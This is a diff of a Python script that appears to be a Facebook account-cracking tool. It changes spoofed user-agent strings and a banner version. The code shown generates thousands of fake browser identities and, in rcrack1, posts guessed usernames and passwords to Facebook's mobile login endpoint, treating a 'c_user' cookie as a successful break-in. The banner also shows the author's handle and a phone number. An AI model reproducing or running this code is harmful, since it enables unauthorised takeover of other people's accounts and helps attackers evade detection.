@@ -59,10 +59,10 @@ ugen = []
 #--------USER-AGENTS------#
 ugen=[]
 for ua in range(50000):
-      a='Mozilla/5.0 (Linux; Android'
+      a='Mozilla/5.0 (Linux; x86_64'
       b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
       y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
-      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103/'
       d=random.randrange(40,115)
       e='0'
       f=random.randrange(3000,6000)
@@ -91,7 +91,7 @@ logo=(f"""
 \033[38;5;46m┃ \033[33;1m√NETWORK \x1b[38;5;196m: \x1b[38;5;196m3G 4G                     \033[38;5;46m┃
 \033[38;5;46m┣━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━┫
 \033[38;5;46m┃ \033[33;1mGITHUB  \x1b[38;5;196m: \x1b[38;5;208mTANJID VAU     \033[38;5;46m┃\033[33;1m BD:RANDOM \033[38;5;46m┃
-\033[38;5;46m┃ \x1b[1;96mWATHSAPP\x1b[38;5;196m: \033[1;97m+8801861513296 \033[38;5;46m┃\033[1;97m\033[1;45mVersion 1.3\033[1;0m\033[1;97m\033[38;5;46m┃
+\033[38;5;46m┃ \x1b[1;96mWATHSAPP\x1b[38;5;196m: \033[1;97m+8801861513296 \033[38;5;46m┃\033[1;97m\033[1;45mVersion 1.0\033[1;0m\033[1;97m\033[38;5;46m┃
 \033[38;5;46m╚━━━━━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━╝\033[1;37m\n""")
 #------MAIN-MENU----#
 def o():
@@ -193,7 +193,7 @@ def rcrack1(uid,pwx,tl):
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',}
+            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',}
             lo = session.post('https://free.facebook.com/login/device-based/regular/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2F&amp;refsrc=deprecated&amp;lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
